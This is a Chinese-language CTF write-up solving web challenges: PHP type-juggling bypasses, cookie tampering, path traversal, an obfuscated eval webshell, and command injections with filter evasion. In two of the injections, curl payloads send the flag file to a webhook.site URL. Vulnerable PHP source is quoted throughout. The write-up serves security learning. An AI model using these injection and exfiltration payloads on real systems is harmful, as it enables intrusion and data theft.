# Web-CTF write up

## Web
### KAIBRO BUY
> http://140.110.112.78:2500

* 直接改 html 
    ```html=
    <input class="nes-input" type="text" name="money" value="99999999" readonly="readonly">
    ```
* 把 value 改成 1000 以內都可以
* flag : `FLAG{baby_money_bypass!}`

### Level
> http://140.110.112.78:25501
> flag is in the level 1000

* 有兩個做法，可以寫 python script 送 1000 次 requests 拿到 flag
* 看 cookie，有一個參數是 level，把 1 改成 1000 就可以了
* flag : `FLAG{I_like_cookie}`

### Secret Login
> http://140.110.112.78:2502/

```php=
<?php

// show the source code
if(isset($_GET['src'])) {
    highlight_file(__FILE__);
    echo "<hr>";
}

// include config file ($secret, $flag, ...)
include("config.php");

// get user input
$pass = $_GET['pass'];

// if user's input match the secret, it will print the flag!
if( strcmp($pass, $secret) == 0 )
    echo $flag;
?>
```

* 可以看到 source code 中用 strcmp 作為兩字串是否一樣的判斷
* 這個函数接受到不符合字符的参数就會發生錯誤，並回傳 0，所以只需要提交一个非字符類型的参数即可使得判斷條件成立
* 漏洞適用 5.3 之前版本的 php
* 所以如果傳入陣列，就可以繞過這個判斷了
* payload : `http://140.110.112.78:2502/?pass[]=`
* flag : `FLAG{php_is_s0_fun_XD}`

### Downloader
> http://140.110.112.78:2505

* 看一下原始碼，可以看到其中一個 link `http://140.110.112.78:2505/download.php?f=cute1.jpg`
* 嘗試下載 `index.php`
    ```php=
    <?php
    include("config.inc.php");
    ?>
    <html>
    <head>
    <meta charset="UTF-8">
    <title>Downloader</title>
    </head>
    <body>
    <h1>File Download</h1>
    <ul>
    <li><a href="download.php?f=cute1.jpg">貓貓1</a></li>
    <li><a href="download.php?f=cute2.jpg">貓貓2</a></li>
    <li><a href="download.php?f=cute3.png">貓貓3</a></li>
    </ul>
    </body>
    </html>
    ```
* 這時候可以看到 `config.inc.php`，嘗試下載他，就可以看到 flag 了
* flag : `FLAG{download_my_config}`

### lightning
> http://140.110.112.78:2507

* 嘗試用 postman 發 get 請求 `http://140.110.112.78:2507/index.php`，發現沒什麼用，推測被永久的 redirect 了
* 直接送 curl `curl http://140.110.112.78:2507/index.php` 發現拿不到資料
* 選擇追蹤過程 `curl --trace-ascii trace.txt http://140.110.112.78:2507/index.php`
    ```bash=
    == Info:   Trying 140.110.112.78...
    == Info: TCP_NODELAY set
    == Info: Connected to 140.110.112.78 (140.110.112.78) port 2507 (#0)
    => Send header, 92 bytes (0x5c)
    0000: GET /index.php HTTP/1.1
    0019: Host: 140.110.112.78:2507
    0034: User-Agent: curl/7.64.1
    004d: Accept: */*
    005a:
    <= Recv header, 20 bytes (0x14)
    0000: HTTP/1.1 302 Found
    <= Recv header, 37 bytes (0x25)
    0000: Date: Mon, 26 Oct 2020 03:37:53 GMT
    <= Recv header, 32 bytes (0x20)
    0000: Server: Apache/2.4.18 (Ubuntu)
    <= Recv header, 20 bytes (0x14)
    0000: Location: flag.php
    <= Recv header, 19 bytes (0x13)
    0000: Content-Length: 0
    <= Recv header, 40 bytes (0x28)
    0000: Content-Type: text/html; charset=UTF-8
    <= Recv header, 2 bytes (0x2)
    0000:
    == Info: Connection #0 to host 140.110.112.78 left intact
    ```
* 可以看到有一個有趣的 location `flag.php`
* 直接用 curl `curl http://140.110.112.78:2507/flag.php` 可以看到 flag
* flag : `FLAG{302_redirect_cool}`

### webshell
> http://140.110.112.78:2508

```php=
<?php

highlight_file(__FILE__);

eval(base64_decode("c3lzdGVtKCRfUE9"."TVFsxMjNdKTs="));
```
* 稍微 base64 decode 一下 `system($_POST[123]);`
* 送 post 參數是 123 直接是 shell 了
* 稍微找一下 flag 可以發現在根目錄
* payload : `cat ../../../flag`
* flag : `FLAG{webshell_bang!}`

### Cat Digger
> http://140.110.112.78:2509/

* 一臉就是 command injection 的樣子
* payload : `ip; your_command`
* source code
    ```php=
    <?php
    // get user input
    $ip = $_GET['ip'];
    $flag = 0;
    if(stripos($ip, "cat") !== FALSE) die("You can't use my cat!");
    if(stripos($ip, "flag") !== FALSE) die("My cat doesn't like flag!");

    $res = shell_exec("dig " . $ip);
    $flag = 1;

    ?>

    <head>
    <link rel="stylesheet" href="bootstrap.css" media="screen">
    </head>
    <body style="padding: 50px">
    <center>
    <div class="jumbotron">
    <h1>Digger</h1><br>
    <form method="get" style="width: 250px">
    <input type="text" placeholder="ip.." name="ip" class="form-control"><br>
    <input type="submit" class="btn btn-primary">
    </form><br>

    </center>
    <?php
    if($flag === 1) {
        echo "<hr>";
        echo "<pre>".$res."</pre>";
    }
    ?>
    </div>
    </body>
    ```
* 然後當你開心的用 `cat` 的時候 ... `You can't use my cat!`，所以用 \ 逃逸一下
* 然後當你開心的訪問 `flag` 的時候 ... `My cat doesn't like flag!`，所以用 \ 逃逸一下
* payload : `0.0.0.0; c\at ../../../fl\ag`
* flag : `FLAG{cat_flag_ez}`

## Web Level 2
### vtim_cmdi
> http://140.110.112.78:31339/

* 這題是 command injection
* 如果給的 ip 是 0.0.0.0 或是 127.0.0.1 會 timeout 
* 這題的 source code 
    ```php=
    <html>
    <body>
    <h1>HTTP Header Reader v0.008</h1>
    <form action="index.php" method="POST">
        <input type="text" size="50" name="url" placeholder="URL">
        <input type="submit" value="submit">
    </from>
    <?php
    $url = str_replace(";", "\;", $_POST['url']);
    $output = shell_exec("curl -I -X GET ".$url);
    if($output != ""){
        echo "<h3>Here's your header :</h3>";
        $array = explode("\n",$output);
        echo "<pre>";
        foreach($array as $str) {
           echo $str;
           echo "<br>";
        }
        echo "</pre>";
    }

    ?>
    </body>
    </html>
    ```
* 只有擋 ; 而已，所以用 && | || 之類的都可以
* payload : `https://www.google.com | cat ../../../flag/Flag/flag`
* flag : `BreakALLCTF{43sy_c0mM4nD_1nj3ctI0N_F0r_fuN}`

### Local File Inclusion
> http://140.110.112.78:2003/

### Baby CMDi
> http://140.110.112.78:30005

* 這一題是 command injection，基本上把該擋的都擋了，除了 `$()`
* 想法是用 webhook 拿到執行 command 的結果
* payload : `curl webhook -d "$(your_command)"`
    * 用雙引號刮起來可以拿到所有的 data，否則只能拿到第一個
* `ls` 之後可以發現有一個 file 是 flag
* source code 
    ```php=
    <html>
    <body>
    <h2>Baby CMDi</h2>

    <form action="index.php" method="POST">
    <input name="ip" type="text" placeholder="Enter IP" /><br />
    <input type="submit" value="Submit" />
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip'])) {
        $waf = array("&", "|", ";", "`", ">", "\t", "\r", "\n", "cat", "flag");
        foreach($waf as $banner){
            if(stripos($_POST['ip'], $banner) !== FALSE) die("Get Out of Here");
        }

        $result = shell_exec("ping -c 3 " . $_POST['ip']);
        echo "<pre>" . $result . "</pre>";
    }
    ?>
    ```
* 用 `c\at f\lag` 拿到 flag，有擋 `cat` `flag`
* payload : `$(curl https://webhook.site/8d972bfe-8675-4a35-b72f-47a0a8c7a187 -d "$(c\at f\lag)")`
* 非預期解：直接訪問 `http://140.110.112.78:30005/flag` 直接吐出 flag 了
* flag : `FLAG{C00001_U_Are_Talent_0f_She11111}`

## Web_Getting Started
### Redirect
> http://140.110.112.78:10203/

* 看原始碼可以看到目的是訪問 `http://140.110.112.78:10203/flag.php` 但是被 redirect 了
* 用 postman 送也沒用
* 直接用 curl 可以拿到 flag
* payload : `curl http://140.110.112.78:10203/flag.php`
* flag : `FLAG{balabalabalabalalalal}`

### Form
> http://140.110.112.78:10204/

* 看一下原始碼可以發現不讓我們送 post
* 直接用 postman 送 post，form data 給 pw=123
* flag : `FLAG{123456789}`

### Shell
> http://140.110.112.78:10210/

## Web Level 3
### youtube_viewer
> http://140.110.112.78:4007/

* command injection
* 比較有趣的一點是這題目有用 `'` 包著 curl，所以要用 `'` 包住外圍，否則會被當作字串執行
* payload : `'$(curl webhook -d "$(your)command")'`
* source code 
    ```php=
    <head>
    <link href="https://fonts.googleapis.com/css?family=IM+Fell+French+Canon+SC" rel="stylesheet">
    </head>
    <body style="background-color: #fefad0;font-family: 'IM Fell French Canon SC', serif;font-size:20px">

    <h1>Youtube Viewer</h1>

    Give me a valid youtube id:
    <form method="get">
    <input type="text" name="v">
    <input type="submit">
    </form><br><br>
    Example: uCLEq9V0-Yk
    <br>
    I will check your input is valid youtube id or not.
    <br><br>
    <?php
            $default="uCLEq9V0-Yk";
            if(isset($_GET['v'])) {
                    $tmp = $_GET['v'];
                    $res = shell_exec("curl -i 'https://img.youtube.com/vi/$tmp/0.jpg'");
                    if(strpos($res, "404 Not Found") !== FALSE) {
                            echo "<h3>Q___Q  Your input seems invalid.</h3><br>";
                    } else {
                            $default = $tmp;
                    }
            }
    ?>
    <iframe id="ytplayer" type="text/html" width="640" height="360"
      src="https://www.youtube.com/embed/<?php echo $default; ?>?autoplay=0"
      frameborder="0"></iframe>
    <!-- hint: backend will download/view the youtube video image and check it exist or not. -->
    <!-- Try more payload -->
    </body>
    ```
* payload : `'$(curl https://webhook.site/8d972bfe-8675-4a35-b72f-47a0a8c7a187 -d "$(cat ../../../flag)")'`
* flag : `FLAG{Blind_cmd_injection_is_so_fun_XD}`

### MyPHP
> http://140.110.112.78:4010/

```php=
<?php
highlight_file(__FILE__);

include("user.php");
// $users = Array('admin'=>'xxxx', ...)

$user = $_GET['user'];
$pass = $_GET['pass'];

if(isset($user) && isset($pass)) {
    if($users[$user] === sha1($pass))
        echo $flag;
    else
        echo "Q______________Q";
}
```
* 滿足 `$users[$user] === sha1($pass)` 即可拿到 flag
* `sha1([]) = null`
* `$user[只要不是 admin] = null`
* payload : `http://140.110.112.78:4010/?user=&pass[]=`
* flag : `FLAG{why_so_ez?}`
